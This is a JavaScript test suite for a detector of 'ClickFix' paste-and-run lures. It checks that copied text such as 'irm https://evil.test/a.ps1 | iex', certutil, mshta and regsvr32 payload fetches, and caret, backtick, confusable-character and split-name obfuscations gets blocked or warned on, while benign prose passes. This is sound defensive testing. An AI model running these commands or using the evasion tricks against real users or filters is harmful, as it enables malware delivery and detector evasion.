const { test } = require("node:test");
const assert = require("node:assert/strict");

const {
  MAX_COPY_TEXT_LENGTH,
  detectClickfixCommand,
  normalizeForDetection,
} = require("./clickfix-policy.js");

const strict = { mode: "strict", excluded_domains: [] };
const warn = { mode: "warn", excluded_domains: [] };

test("strict mode blocks supported commands after Unicode and whitespace normalization", () => {
  const result = detectClickfixCommand(
    `${" ".repeat(5000)}\u200bPoWeRsHeLL\u00a0-ExecutionPolicy Bypass`,
    strict,
    { url: "https://page.test/" }
  );
  assert.equal(result.action, "block");
  assert.match(result.normalizedText, /^PoWeRsHeLL /);
});

test("strict mode allows prose that merely mentions a tool", () => {
  assert.equal(
    detectClickfixCommand("This article explains PowerShell.", strict, { url: "https://page.test/" }).action,
    "allow"
  );
});

test("strict mode blocks quoted, absolute, and environment-based executable paths", () => {
  for (const command of [
    '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c whoami',
    "%SystemRoot%\\System32\\cmd.exe /c whoami",
    "/usr/bin/bash -c whoami",
    "start \"\" \"C:\\Windows\\System32\\mshta.exe\" https://evil.test/a.hta",
    "& '/usr/bin/python3' -c 'print(1)'",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
  }
});

// Issue #79 changed the strict contract: any explicit executable or path in
// command position blocks, including third-party binaries. Prose that merely
// mentions a path keeps its leading word in command position and stays allowed.
test("strict mode blocks arbitrary executables and explicit paths in command position", () => {
  for (const text of [
    '"C:\\Program Files\\Example\\viewer.exe" file.txt',
    '"C:\\Program Files (x86)\\Vendor\\payload.exe" argument',
    '"C:\\Users\\a@b\\payload.exe" argument',
    "file:///C:/Temp/payload.exe",
    "tool@evil.exe /c calc",
    "tool@evil.com /c calc",
    "taskmgr.e^xe",
    "taskmgr.e`xe",
    "/usr/bin/printf hello",
    "taskmgr.exe",
  ]) {
    assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "block", text);
  }
  for (const text of [
    "The executable is C:\\Windows\\System32\\cmd.exe.",
    "Download setup.exe from the vendor page.",
    "https://example.test/payload.exe",
  ]) {
    assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "allow", text);
  }
});

test("strict mode handles common launchers, wrappers, aliases, and cmd token splicing", () => {
  for (const command of [
    "&'powershell' -c calc",
    'start "title" powershell -c calc',
    "start /b powershell -c calc",
    'po""wershell -c calc',
    "power^shell -c calc",
    "''bash -c id",
    "env bash -c id",
    "sudo -u root bash -c id",
    "sudo -H bash -c id",
    "command -p bash -c id",
    "nohup /bin/sh -c id",
    "b'a's'h' -c id",
    'start "" /b powershell -c calc',
    "%ComSpec% /c calc",
    "time powershell -c id",
    "nice -n 5 bash -c id",
    'eval "powershell -c calc"',
    "source /tmp/payload.sh",
    ". /tmp/payload.sh",
    "start.exe harmless",
    "call.exe harmless",
    "sudo.exe harmless",
    "env.exe harmless",
    "/tmp/sudo harmless",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
  }
});

test("both modes scan bounded command starts after shell syntax and redirection prefixes", () => {
  for (const command of [
    "echo ready && powershell -c calc",
    "printf ready | /bin/bash -c id",
    "echo ready\npwsh -c calc",
    ":; (python3 -c 'print(1)')",
    "1 | ForEach-Object { iwr https://evil.test/a.ps1 -OutFile payload.ps1 }",
    "1|%{irm https://evil.test/a.ps1 | iex}",
    "Start-Job { Start-BitsTransfer https://evil.test/a.exe payload.exe }",
    "echo $(irm https://evil.test/a.ps1 | iex)",
    'Write-Output "C:\\temp\\"; iwr https://evil.test/a.ps1 -OutFile payload.ps1',
    'Write-Output C:\\; iwr https://evil.test/a.ps1 -OutFile payload.ps1',
    "@powershell -c calc",
    ">nul powershell -c calc",
    "2>/tmp/clickfix-error bash -c id",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("command-start scanning is bounded and fails closed only beyond its limit", () => {
  const atLimit = "echo ok;".repeat(63) + "printf done";
  const overLimit = "echo ok;".repeat(64) + "printf done";

  assert.equal(detectClickfixCommand(atLimit, strict, { url: "https://page.test/" }).action, "allow");
  assert.equal(detectClickfixCommand(atLimit, warn, { url: "https://page.test/" }).action, "allow");
  assert.equal(detectClickfixCommand(overLimit, strict, { url: "https://page.test/" }).action, "block");
  assert.equal(detectClickfixCommand(overLimit, warn, { url: "https://page.test/" }).action, "warn");
});

test("strict mode finds commands next to redirections and group closers", () => {
  for (const command of [
    "taskmgr.exe>nul",
    "powershell>nul",
    "cmd.exe<in.txt",
    "payload.exe>>log.txt",
    "(taskmgr.exe)",
    "$(taskmgr.exe)",
    "&{taskmgr.exe}",
    "2>&1 taskmgr.exe",
    "&>out taskmgr.exe",
    "&>>out taskmgr.exe",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
  }

  for (const command of [
    "bash</tmp/script",
    "bash 0</tmp/script",
    "python3 -u < payload.py",
    "$(bash)",
    "$(taskmgr.exe)",
    "&{powershell}",
    "&{taskmgr.exe}",
    "2>&1 powershell -c calc",
    "*>&1 powershell -c calc",
    ">|out powershell -c calc",
    "2>|out bash -c id",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("bounded POSIX control prefixes expose the following command", () => {
  for (const command of [
    "if true; then powershell -c calc; fi",
    "for x in 1; do bash -c id; done",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("strict mode promotes only high-confidence embedded warn detections", () => {
  for (const command of [
    "conhost.exe --headless powershell -c calc",
    'forfiles /c "cmd /c calc"',
    'forfiles /c "po^wershell -c calc"',
    'forfiles /c "c^md /c calc"',
    'runas /user:victim "powershell -c calc"',
    'runas /user:victim "powershell irm https://evil.test/a | iex"',
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }

  // Issue #79: tool and behavior evidence must share a command clause, so a
  // tool name and an unrelated URL in prose no longer produce a warning.
  const prose = "This article mentions PowerShell and links to https://docs.example.test/reference.";
  assert.equal(detectClickfixCommand(prose, strict, { url: "https://page.test/" }).action, "allow");
  assert.equal(detectClickfixCommand(prose, warn, { url: "https://page.test/" }).action, "allow");
});

test("direct PowerShell downloader and executor commands are recognized", () => {
  for (const command of [
    "irm https://evil.test/a.ps1 | iex",
    "iwr https://evil.test/a.ps1 -OutFile payload.ps1",
    "Invoke-RestMethod https://evil.test/a.ps1 | Invoke-Expression",
    "Invoke-WebRequest https://evil.test/a.ps1 -OutFile payload.ps1",
    "Start-BitsTransfer https://evil.test/a.exe payload.exe",
    "Start-Process payload.exe",
    "saps payload.exe",
    "Invoke-Command -ScriptBlock { calc }",
    "icm -ScriptBlock { calc }",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("encoded-command aliases and executable-position shell escapes cannot hide commands", () => {
  for (const command of [
    "pwsh -ec SQBFAFgA",
    "power^\nshell -c calc",
    "p`o`w`e`r`s`h`e`l`l -c calc",
    "p\\owershell -c calc",
    "/usr/bin/b\\ash -c id",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("the small benign corpus stays allowed in strict mode", () => {
  const benign = [
    "This article explains PowerShell.",
    "This article lists the saps and icm PowerShell aliases.",
    "Get-Help Invoke-WebRequest",
    'Write-Host "Invoke-WebRequest https://docs.example.test/reference"',
    "Use `PowerShell` in the documentation example.",
    "The literal p\\owershell token is not a command here.",
  ];
  for (const text of benign) {
    assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "allow", text);
  }
  for (const text of benign) {
    assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "allow", text);
  }
});

test("GNU env split-string options expose their executable to strict and warn inspection", () => {
  for (const command of [
    "env -S 'bash -c id'",
    "env --split-string='bash -c id'",
    'env --split-string="bash -c id"',
    "env -Sbash -c id",
  ]) {
    const strictResult = detectClickfixCommand(command, strict, { url: "https://page.test/" });
    assert.equal(strictResult.action, "block", command);
    assert.match(strictResult.tool, /bash/i, command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("POSIX assignments, exec, and absolute wrapper paths cannot hide a protected command", () => {
  for (const command of [
    "FOO=bar bash -c id",
    "FOO=bar /bin/bash -c id",
    "FOO=bar BAZ=qux exec bash -c id",
    "exec -a harmless bash -c id",
    "/usr/bin/env bash -c id",
    "/usr/bin/sudo -u root /bin/bash -c id",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
  // Issue #79: the explicit path now blocks in strict mode on its own, so a
  // bare unprotected command name is the remaining pass-through shape.
  assert.equal(
    detectClickfixCommand("FOO=bar printf hello", strict, { url: "https://page.test/" }).action,
    "allow"
  );
});

test("wrapper depth and option limits fail closed without penalizing the boundary", () => {
  const commandsAtLimit = [
    `${"env ".repeat(8)}bash --version`,
    `env ${"-u NAME ".repeat(8)}bash --version`,
    `${Array.from({ length: 8 }, (_, index) => `V${index}=x`).join(" ")} bash --version`,
  ];
  const commandsOverLimit = [
    `${"env ".repeat(9)}bash --version`,
    `env ${"-u NAME ".repeat(9)}bash --version`,
    `${Array.from({ length: 9 }, (_, index) => `V${index}=x`).join(" ")} bash --version`,
  ];

  for (const command of commandsAtLimit) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "allow", command);
  }

  for (const command of commandsOverLimit) {
    const strictResult = detectClickfixCommand(command, strict, { url: "https://page.test/" });
    assert.equal(strictResult.action, "block", command);
    assert.equal(strictResult.tool, "unverified wrapped command", command);

    const warnResult = detectClickfixCommand(command, warn, { url: "https://page.test/" });
    assert.equal(warnResult.action, "warn", command);
    assert.equal(warnResult.tool, "unverified wrapped command", command);
  }
});

test("warn mode catches the documented Python urllib exec example", () => {
  const result = detectClickfixCommand(
    'python3 -c "import urllib.request; exec(urllib.request.urlopen(url).read())"',
    warn,
    { url: "https://page.test/" }
  );
  assert.equal(result.action, "warn");
});

test("warn mode catches adjacent shell quoting used to hide the executable token", () => {
  assert.equal(
    detectClickfixCommand("b'a's'h' -c id", warn, { url: "https://page.test/" }).action,
    "warn"
  );
});

test("warn mode covers administrative tools omitted by the old detector", () => {
  for (const command of [
    "certutil -urlcache -split -f https://evil.test/a.exe",
    "bitsadmin /transfer job https://evil.test/a.exe C:\\a.exe",
    "mshta https://evil.test/a.hta",
    "rundll32 https://evil.test/a.dll,Entry",
    "regsvr32 /s /i:https://evil.test/a.sct scrobj.dll",
    "msiexec /i https://evil.test/a.msi",
    "schtasks /create /tr 'powershell -c evil'",
  ]) {
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("warn mode catches direct script and process execution forms without a URL", () => {
  for (const command of [
    "powershell -Command Start-Process calc.exe",
    "mshta vbscript:Close(Execute(\"GetObject('script:test')\"))",
    "rundll32 payload.dll,EntryPoint",
    "wscript payload.vbs",
    "regsvr32 /s /i:payload.sct scrobj.dll",
    "msiexec /i \\\\evil.test\\share\\payload.msi",
    "wmic process call create calc.exe",
    "schtasks /create /tn x /tr calc.exe",
    'po""wershell -Command Start-Process calc.exe',
    "power^shell -Command Start-Process calc.exe",
    "%ComSpec% /c calc.exe",
  ]) {
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("warn mode catches the PowerShell path-indirection fixture", () => {
  const command = "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\PoWeRsHeLl.ExE -NoProfile -NonInteractive -Command \"Write-Output 'CLICKFIX_TEST_ONLY'\"";
  assert.equal(detectClickfixCommand(command, warn, { url: "file:///fixture.html" }).action, "warn");
});

test("PowerShell option names in ordinary prose are not execution evidence", () => {
  const prose = "The powershell documentation says to use -Command for a command string and -File for a script.";
  assert.equal(detectClickfixCommand(prose, warn, { url: "https://docs.example/" }).action, "allow");
  assert.equal(detectClickfixCommand(prose, strict, { url: "https://docs.example/" }).action, "allow");
});

test("warn mode allows an ordinary local administration example", () => {
  assert.equal(
    detectClickfixCommand("powershell Get-Process", warn, { url: "https://page.test/" }).action,
    "allow"
  );
});

test("domain exclusions apply only in warn mode and use hostname boundaries", () => {
  const settings = { mode: "warn", excluded_domains: ["trusted.example"] };
  const command = "powershell iwr https://evil.test/a.ps1 | iex";
  assert.equal(detectClickfixCommand(command, settings, { url: "https://docs.trusted.example/a" }).action, "allow");
  assert.equal(detectClickfixCommand(command, settings, { url: "https://trusted.example.evil.test/a" }).action, "warn");
  assert.equal(detectClickfixCommand(command, { ...settings, mode: "strict" }, { url: "https://trusted.example/" }).action, "block");
});

// ===========================================================================
// Issue #79 — structural hardening regressions. Expected strict and warn
// verdicts are stored explicitly for every case.
// ===========================================================================

test("the three reported bypass examples receive the expected verdicts", () => {
  const bare = detectClickfixCommand("taskmgr.exe", strict, { url: "https://page.test/" });
  assert.equal(bare.action, "block");
  assert.equal(bare.reasons[0], "executable file reference in command position");
  // Command-shaped in warn mode, but no risk signal, so no interstitial.
  const bareWarn = detectClickfixCommand("taskmgr.exe", warn, { url: "https://page.test/" });
  assert.equal(bareWarn.action, "allow");
  assert.deepEqual(bareWarn.reasons, ["command-shaped content without risk signals"]);
  assert.equal(bareWarn.tool, "taskmgr.exe");

  // The "о" is Cyrillic U+043E.
  const confusable = 'p\u043EwerShell.exe -Command "Start-Process https://example.com"';
  const confusableStrict = detectClickfixCommand(confusable, strict, { url: "https://page.test/" });
  assert.equal(confusableStrict.action, "block");
  assert.equal(confusableStrict.canonicalTool, "powershell");
  assert.ok(confusableStrict.reasons.includes("confusable command name"));
  assert.equal(detectClickfixCommand(confusable, warn, { url: "https://page.test/" }).action, "warn");

  const split = 'power shell.exe -Command "Write-Output CLICKFIX_TEST_ONLY"';
  const splitStrict = detectClickfixCommand(split, strict, { url: "https://page.test/" });
  assert.equal(splitStrict.action, "block");
  assert.equal(splitStrict.canonicalTool, "powershell");
  assert.ok(splitStrict.reasons.includes("split command name"));
  assert.equal(detectClickfixCommand(split, warn, { url: "https://page.test/" }).action, "warn");
});

test("strict mode blocks launchable suffixes, 8.3 names, UNC, and rooted paths", () => {
  for (const command of [
    "unlisted.bat /q",
    "setup.msi",
    "services.msc",
    "helper.scr argument",
    "\\\\fileserver\\tools\\deploy.exe",
    "%APPDATA%\\vendor\\tool.xyz argument",
    "$env:TEMP\\payload argument",
    "..\\tools\\helper.cmd",
    "./deploy.sh --now",
    "~/bin/agent start",
    "POWERS~1.EXE -c calc",
    "POWERS~1 -c calc",
    "\\Windows\\System32\\taskmgr",
    "C:Windows\\System32\\taskmgr",
    "$HOME/bin/payload",
    "cmd.exe. /c calc",
    "Windows\\System32\\taskmgr",
    "tools\\payload argument",
    "bin/payload --run",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
  }
  const short = detectClickfixCommand("POWERS~1 -c calc", strict, { url: "https://page.test/" });
  assert.ok(short.reasons.includes("8.3 command name"));
});

test("strict mode blocks variables and expressions used as the executable", () => {
  for (const command of [
    "%COMSPEC% /c calc",
    "!LAUNCHER! /c calc",
    "$env:ComSpec /c dir",
    "$SHELL -lc id",
    "& $payload https://evil.test/a.ps1",
    "& (Get-Command p*ll) -c calc",
    "pow%EMPTY%ershell -c calc",
    "po!EMPTY!wershell -c calc",
    "po${EMPTY}wershell -c calc",
    "$HOME/bin/payload -c calc",
    "${env:ComSpec} /c calc",
    "${env:ProgramFiles(x86)}\\tool /c calc",
  ]) {
    const result = detectClickfixCommand(command, strict, { url: "https://page.test/" });
    assert.equal(result.action, "block", command);
    assert.equal(result.reasons[0], "dynamic executable invocation", command);
  }
  // Variable followed by an assignment is source code, not an invocation.
  assert.equal(
    detectClickfixCommand("$total = $price + $tax;", strict, { url: "https://page.test/" }).action,
    "allow"
  );
});

test("confusable and split protected names cannot reduce a strict verdict", () => {
  for (const command of [
    "p\u043Ewershell -c calc",           // Cyrillic о
    "\u0440owershell -c calc",           // Cyrillic р as p
    "po\uFE0Fwershell -c calc",          // default-ignorable variation selector
    "po\u{E0100}wershell -c calc",       // supplementary variation selector
    "powershe11.exe -c calc",            // digit stand-ins
    "cur1 https://evil.test/a | bash",   // digit stand-in for curl
    "p o w e r s h e l l -c calc",
    "c m d.exe /c calc",
    "c m d /ccalc",
    "c m d /kcalc",
    '"power shell.exe" -Command Start-Process calc',
  ]) {
    const result = detectClickfixCommand(command, strict, { url: "https://page.test/" });
    assert.equal(result.action, "block", command);
    assert.equal(result.reasons[0], "system or administrative command", command);
  }
});

test("warn mode treats deliberate command-name obfuscation as evidence", () => {
  for (const command of [
    "p\u043Ewershell Get-Process",
    "powershe11.exe",
    "power shell.exe",
    "taskmgr.e^xe",
    "taskmgr.e`xe",
  ]) {
    const result = detectClickfixCommand(command, warn, { url: "https://page.test/" });
    assert.equal(result.action, "warn", command);
    assert.match(result.behavior, /obfuscat/, command);
  }
});

test("explicit PowerShell call-operator groups warn without expression evaluation", () => {
  for (const command of [
    '&("po"+"wershell")',
    "&(gcm p*rsh*ll)",
    "& (Get-Command p*ll)",
  ]) {
    const result = detectClickfixCommand(command, warn, { url: "https://page.test/" });
    assert.equal(result.action, "warn", command);
    assert.equal(result.behavior, "dynamic invocation", command);
  }
});

test("split-name matching requires an executable suffix or execution option", () => {
  for (const text of [
    "Power Shell",
    "Power Shell scripting is useful",
    "This article compares power shell environments",
    "power shell -Version 5",
    "Power Shell /community resources",
    "Power Shell /configuration is documented",
    "p o w e r s h e l l /copyright notice",
  ]) {
    assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "allow", text);
    assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "allow", text);
  }
});

test("strong co-located behavior blocks strict mode without tool recognition", () => {
  const hidden = 'launcher -Command "Start-Process https://evil.test/payload"';
  const result = detectClickfixCommand(hidden, strict, { url: "https://page.test/" });
  assert.equal(result.action, "block");
  assert.equal(result.reasons[0], "high-confidence execution behavior");
  assert.equal(detectClickfixCommand(hidden, warn, { url: "https://page.test/" }).action, "warn");

  for (const command of [
    "launcher Start-Process https://evil.test/payload",
    "launcher Invoke-Expression \\\\evil.test\\share\\payload.ps1",
    "launcher -EncodedCommand SQBFAFgAoABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4A",
  ]) {
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }

  // A single overlapping match may not corroborate itself.
  assert.equal(
    detectClickfixCommand("launcher -EncodedCommand", strict, { url: "https://page.test/" }).action,
    "allow"
  );
  assert.equal(
    detectClickfixCommand("launcher iex", strict, { url: "https://page.test/" }).action,
    "allow"
  );

  for (const prose of [
    "This guide uses Start-Process with https://docs.example.test/reference.",
    "This guide uses -Command with Start-Process and https://docs.example.test/reference.",
    "The -Command option invokes Start-Process for https://docs.example.test/reference.",
    "We use Start-Process with Base64 payloads.",
    "You can compare Invoke-Expression and FromBase64String.",
    "Documentation for Start-Process discusses %COMSPEC%.",
  ]) {
    assert.equal(detectClickfixCommand(prose, strict, { url: "https://page.test/" }).action, "allow", prose);
    assert.equal(detectClickfixCommand(prose, warn, { url: "https://page.test/" }).action, "allow", prose);
  }
});

test("warn mode requires a risk signal beside a generic executable", () => {
  for (const text of [
    "taskmgr.exe",
    "services.msc",
    '"C:\\Program Files\\Example\\viewer.exe" file.txt',
    "viewer.exe report.txt",
    "/usr/bin/printf hello",
    "C:\\Users\\M\u0430ria\\Documents\\report.docx",
    "\u043F\u0440\u043E\u0433\u0440\u0430\u043C\u043C\u0430.exe",
    "\u5DE5\u5177.exe",
  ]) {
    assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "allow", text);
  }
  for (const command of [
    "viewer.exe https://evil.test/payload",
    "installer.msi \\\\evil.test\\share\\module",
    "update.exe && anything",
    "s\u0435tup.exe argument",              // Cyrillic е → mixed-script obfuscation
    "loader.exe -EncodedCommand SQBFAFgAoAB",
    "viewer.exe --silent https://evil.test/payload",
    "installer.exe /q \\\\evil.test\\share\\module",
    "loader.exe --flag -EncodedCommand SQBFAFgAoAB",
    "taskmgr.e^xe",
    "taskmgr.e`xe",
  ]) {
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("warn mode recognizes command-bearing proxy arguments one level deep", () => {
  const proxies = new Map([
    ['runas /user:admin "helper"', "runas"],
    ["wt new-tab notepad", "wt"],
    ["wsl helper", "wsl"],
    ["conhost --headless notepad", "conhost"],
    ["pcalua -a helper", "pcalua"],
    ['forfiles /p C:\\ /m *.txt /c "helper"', "forfiles"],
  ]);
  for (const [command, canonicalTool] of proxies) {
    const result = detectClickfixCommand(command, warn, { url: "https://page.test/" });
    assert.equal(result.action, "warn", command);
    assert.equal(result.canonicalTool, canonicalTool, command);
    assert.equal(result.behavior, "command-bearing proxy argument", command);
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
  }

  const job = detectClickfixCommand("Start-Job { calc }", warn, { url: "https://page.test/" });
  assert.equal(job.action, "warn");
  assert.equal(job.behavior, "direct execution command");

  for (const incomplete of ["pcalua -a", "runas /user:admin", "wt new-tab"]) {
    assert.equal(detectClickfixCommand(incomplete, warn, { url: "https://page.test/" }).action, "allow", incomplete);
  }

  for (const configurationOnly of [
    "wsl -d Ubuntu",
    "wsl --distribution Ubuntu",
    "wsl --user root",
    "wt --profile Ubuntu",
    "wt -d C:\\work",
    "conhost --headless --width 100",
  ]) {
    assert.equal(detectClickfixCommand(configurationOnly, warn, { url: "https://page.test/" }).action,
      "allow", configurationOnly);
  }
  for (const command of ["wsl -d Ubuntu bash", "wsl /bin/bash"]) {
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
  }
});

test("warn mode detects piped input without warning on ordinary command pipelines", () => {
  const piped = detectClickfixCommand("echo payload | bash", warn, { url: "https://page.test/" });
  assert.equal(piped.action, "warn");
  assert.equal(piped.behavior, "piped input to command");
  assert.equal(detectClickfixCommand("echo payload | bash", strict, { url: "https://page.test/" }).action, "block");
  assert.equal(detectClickfixCommand("echo payload |& bash", warn, { url: "https://page.test/" }).action, "warn");

  for (const command of [
    "bash --version | head -1",
    "python3 -m venv .venv | tee build.log",
    "powershell Get-Process | Sort-Object CPU",
    "powershell Get-Process && echo done",
    "/usr/bin/cat file | /usr/bin/grep x",
  ]) {
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "allow", command);
  }
  assert.equal(
    detectClickfixCommand("echo data | payload.exe && calc", warn, { url: "https://page.test/" }).action,
    "warn"
  );
});

test("attached and abbreviated execution options count as command behavior", () => {
  for (const command of [
    "cmd /ccalc",
    "cmd /k dir",
    "powershell -cwa Get-Date extra",
    "pwsh -CommandWithArgs Get-Date extra",
    "powershell -encodedarguments AAAA",
    "powershell.cmd -Command Get-Date",
    "cmd.com /c calc",
    "bash -lc id",
    "node -e 'process.exit()'",
    "perl -e 'system(1)'",
    "python3 script.py",
    "python -cprint(1)",
    "py -cprint(1)",
    "perl -eprint(1)",
    "node --eval=console.log(1)",
    "node --print=1+1",
    "php -r 'echo(1);'",
    "php payload.php",
    "ruby payload.rb",
    "perl payload.pl",
    "osascript payload.scpt",
    "python -u payload.py",
    "python3 -B payload.py",
    "node --no-warnings payload.js",
    "perl -w payload.pl",
    "ruby -w payload.rb",
    "bash -x payload.sh",
    "osascript -l JavaScript payload.js",
    "wsl -e /bin/sh",
  ]) {
    assert.equal(detectClickfixCommand(command, warn, { url: "https://page.test/" }).action, "warn", command);
    assert.equal(detectClickfixCommand(command, strict, { url: "https://page.test/" }).action, "block", command);
  }
  // Module execution stays out of warn-mode evidence: ordinary developer use.
  assert.equal(
    detectClickfixCommand("python3 -m venv .venv", warn, { url: "https://page.test/" }).action,
    "allow"
  );
  assert.equal(detectClickfixCommand("python -E -m pip --version", warn, { url: "https://page.test/" }).action, "allow");
  assert.equal(detectClickfixCommand("bash -C", warn, { url: "https://page.test/" }).action, "allow");
});

test("the expanded benign corpus keeps its explicit strict and warn verdicts", () => {
  const benignBothModes = [
    "This article mentions PowerShell and links to https://docs.example.test/reference.",
    "The powershell documentation says to use -Command for a command string and -File for a script.",
    "Run the installer, then open Task Manager if setup.exe hangs.",
    "ipconfig /all",
    "netstat -ano",
    "user@example.com",
    "const helper = require('./util');",
    "This guide uses Start-Process with https://docs.example.test/reference.",
    "import os",
    'print("hello world")',
  ];
  for (const text of benignBothModes) {
    assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "allow", text);
    assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "allow", text);
  }
  // Ordinary commands and third-party paths remain usable in warn mode even
  // though the severe strict contract blocks them.
  const benignWarnOnly = [
    "powershell Get-Process",
    "C:\\Program Files\\Vendor\\tool.exe report.txt",
    "C:\\Users\\J\u00F3se\\Documents\\informe.docx",
    "Start-Process accepts a FilePath parameter.",
    "Invoke-WebRequest is a PowerShell cmdlet.",
    "PowerShell scripts commonly use the .ps1 extension.",
    "setup.exe is available at https://vendor.example/setup.exe",
    "example.com redirects to https://example.com/",
    "certutil -hashfile file SHA256",
    "schtasks /Query /FO LIST",
    "bitsadmin /list",
    "msiexec /?",
    "curl -c cookies.txt",
    "wget -c download.zip",
    "2>&1 taskmgr.exe",
    "&>out taskmgr.exe",
    "start.exe harmless",
    "/tmp/sudo harmless",
  ];
  for (const text of benignWarnOnly) {
    assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "allow", text);
  }
});

test("normalization and skeleton matching never rewrite the original text", () => {
  const input = 'p\u043EwerShell.exe -Command "Start-Process https://example.com"';
  const result = detectClickfixCommand(input, strict, { url: "https://page.test/" });
  assert.equal(result.originalText, input);
  // The Cyrillic letter survives into the normalized view too; the skeleton
  // exists only for matching and evidence.
  assert.ok(result.normalizedText.includes("\u043E"));
});

test("maximum-length input stays bounded and roughly linear", () => {
  const prose = "lorem ipsum dolor sit amet consectetur adipiscing elit ".repeat(1200)
    .slice(0, MAX_COPY_TEXT_LENGTH);
  const separators = `${"x".repeat(1000)};`.repeat(60) + "y".repeat(4000);
  const escapes = "p^o`w\\e".repeat(8000);
  const started = process.hrtime.bigint();
  for (const text of [prose, separators, escapes]) {
    detectClickfixCommand(text, strict, { url: "https://page.test/" });
    detectClickfixCommand(text, warn, { url: "https://page.test/" });
  }
  const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;
  assert.ok(elapsedMs < 1000, `classification took ${elapsedMs}ms`);
});

test("oversized text fails closed without running normalization", () => {
  const text = `ordinary${"x".repeat(MAX_COPY_TEXT_LENGTH)}`;
  assert.equal(detectClickfixCommand(text, strict, { url: "https://page.test/" }).action, "block");
  assert.equal(detectClickfixCommand(text, warn, { url: "https://page.test/" }).action, "warn");
});

test("normalization joins continuations and removes directional controls", () => {
  assert.equal(normalizeForDetection("po\uFE0Fwershell"), "powershell");
  assert.equal(normalizeForDetection("po\u{E0100}wershell"), "powershell");
  assert.equal(normalizeForDetection("  power\u202Eshell \\\n -c   test  "), "powershell -c test");
});
